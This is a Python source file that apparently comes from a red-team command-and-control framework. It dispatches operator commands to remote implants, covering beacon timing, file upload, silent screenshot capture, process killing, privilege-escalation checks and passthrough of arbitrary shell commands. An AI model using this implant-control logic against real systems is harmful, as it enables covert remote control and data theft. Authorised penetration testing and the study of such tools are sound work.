import base64, re, traceback, os
from Alias import py_alias
from Colours import Colours
from Utils import randomuri, validate_sleep_time
from DB import new_task, update_sleep, update_label, unhide_implant, kill_implant, get_implantdetails, get_pid
from AutoLoads import check_module_loaded
from Help import py_help1
from Config import ModulesDirectory
from Core import readfile_with_completion
from Utils import argp

def handle_py_command(command, user, randomuri, startup):
    # alias mapping
    for alias in py_alias:
      if alias[0] == command.lower()[:len(command.rstrip())]:
        command = alias[1]
      
    if 'beacon' in command.lower() or 'set-beacon' in command.lower() or 'setbeacon' in command.lower():
      new_sleep = command.replace('set-beacon ', '')
      new_sleep = new_sleep.replace('setbeacon ', '')
      new_sleep = new_sleep.replace('beacon ', '').strip()
      if not validate_sleep_time(new_sleep):
        print(Colours.RED)
        print("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
        print(Colours.GREEN)
      else:
        command = '$sleeptime = %s' % new_sleep
        new_task(command, user, randomuri)
        update_sleep(new_sleep, randomuri)

    elif (command.lower().startswith('label-implant')):
        label = command.replace('label-implant ', '')
        update_label(label, randomuri)
        startup(user)

    elif "searchhelp" in command.lower():
      searchterm = (command.lower()).replace("searchhelp ","")
      import string
      helpful = string.split(py_help1, '\n')
      for line in helpful:
        if searchterm in line.lower():
          print (line)
    
    elif "unhide-implant" in command.lower():
      unhide_implant(randomuri)

    elif "hide-implant" in command.lower():
      kill_implant(randomuri)

    elif command.lower() == 'sai' or command.lower() == 'sai ':
      new_task('startanotherimplant', user, randomuri)

    elif "upload-file" in command.lower():
      source = ""
      destination = ""
      s = ""
      if command.strip().lower() == "upload-file":
        source = readfile_with_completion("Location of file to upload: ")
        while not os.path.isfile(source):
          print("File does not exist: %s" % source)
          source = readfile_with_completion("Location of file to upload: ")
        destination = raw_input("Location to upload to: ")
      else:
        args = argp(command)
        source = args.source
        destination = args.destination
      try:
        with open(source, "rb") as source_file:
          s = source_file.read()
        if s:
          sourceb64 = base64.b64encode(s)
          destination = destination.replace("\\","\\\\")
          print ("")
          print ("Uploading %s to %s" % (source, destination))
          uploadcommand = "upload-file \"%s\":%s" % (destination, sourceb64)
          new_task(uploadcommand, user, randomuri)
        else:
          print("Source file could not be read or was empty")
      except Exception as e:
        print ("Error with source file: %s" % e)
        traceback.print_exc()

    elif command.lower() == "help" or command == "?" or command.lower() == "help ":
      print (py_help1)

    elif "loadmoduleforce" in command.lower():
      params = re.compile("loadmoduleforce ", re.IGNORECASE)
      params = params.sub("", command)
      check_module_loaded(params, randomuri, user, force=True)

    elif "loadmodule" in command.lower():
      params = re.compile("loadmodule ", re.IGNORECASE)
      params = params.sub("", command)
      check_module_loaded(params, randomuri, user)

    elif 'get-screenshot' in command.lower():
      taskcmd = "screencapture -x /tmp/s;base64 /tmp/s;rm /tmp/s"
      new_task(taskcmd, user, randomuri)

    elif "kill-implant" in command.lower() or "exit" in command.lower():
      impid = get_implantdetails(randomuri)
      ri = raw_input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
      if ri.lower() == "n":
        print ("Implant not terminated")
      if ri == "":
        pid = get_pid(randomuri)
        new_task("kill -9 %s" % pid, user, randomuri)
        kill_implant(randomuri)
      if ri.lower() == "y":
        pid = get_pid(randomuri)
        new_task("kill -9 %s" % pid, user, randomuri)
        kill_implant(randomuri)

    elif (command == "back") or (command == "clear") or (command == "back ") or (command == "clear "):
      startup(user)
    
    elif "linuxprivchecker" in command.lower():
      params = re.compile("linuxprivchecker", re.IGNORECASE)
      params = params.sub("", command)
      module = open("%slinuxprivchecker.py" % ModulesDirectory, 'r').read()
      encoded_module = base64.b64encode(module)
      taskcmd = "linuxprivchecker -pycode %s %s" % (encoded_module, params)
      new_task(taskcmd, user, randomuri)

    else:
      if command:
        new_task(command, user, randomuri)
      return